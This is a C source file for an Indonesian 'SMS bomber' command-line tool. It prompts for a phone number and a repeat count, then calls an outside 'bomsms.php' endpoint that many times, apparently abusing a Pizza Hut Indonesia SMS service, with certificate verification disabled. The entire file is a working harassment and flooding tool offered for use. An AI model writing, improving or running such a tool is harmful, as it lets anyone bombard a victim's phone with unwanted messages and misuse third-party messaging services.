/**
 * 
 * Use Server From Pizza Hut Indon
 * 
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

char* gabung(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1);
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void start(){
    char *a = "   _____ __  ________ ____                  __             \n";
    char *b = gabung(a,"  / ___//  |/  / ___// __ )____  ____ ___  / /_  ___  _____\n  \\__ \\/ /|_/ /\\__ \\/ __  / __ \\/ __ `__ \\/ __ \\/ _ \\/ ___/\n");
    char *c = gabung(b, " ___/ / /  / /___/ / /_/ / /_/ / / / / / / /_/ /  __/ /    \n/____/_/  /_//____/_____/\\____/_/ /_/ /_/_.___/\\___/_/     \n");
    char *d = gabung(c, "\n");
    printf("%s", d);
}

int curl(char *data){
    CURL *curl;
    CURLcode code;
    char *url = gabung("https://api.xaynet.id/bomsms.php?nomor=", data);

    curl = curl_easy_init();
    if(!curl){
        printf("[\e[31;1mERROR\e[0m]> Curl Failed\n");
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    code = curl_easy_perform(curl);
    if(code != CURLE_OK){
        printf("[\e[31;1mERROR\e[0m]> %s\n", curl_easy_strerror(code));
        curl_easy_cleanup(curl);
        return 1;
    }
    curl_global_cleanup();
    return 0;
}

int main(void)
{
  
  char num[13] = {'\0'};
  int count = 0;

  printf("==========================[ PROJECT ]==========================\n");
  start();
  printf("======================[ Version : 1.01 ]=======================\n\n");
  printf("[INPUT]> Nomor : 0");
  scanf("%[0-9]", num);
  printf("%s\n", num);
  
  if(num[0] == '\0'){
      printf("[\e[31;1mERROR\e[0m]> Masukan Hanya Nomor\n");
      exit(0);
  }
  
  printf("[INPUT]> Jumlah : ");
  scanf("%d", &count);
  if(count <= 0){
      printf("[\e[32;1mINFO\e[0m]> Set Ke 1");
  }
  for (int i = 0; i < count; i++)
  {
      curl(num);
  }

  printf("[\e[32;1mINFO\e[0m]> Completed\n");
  return 0;
}
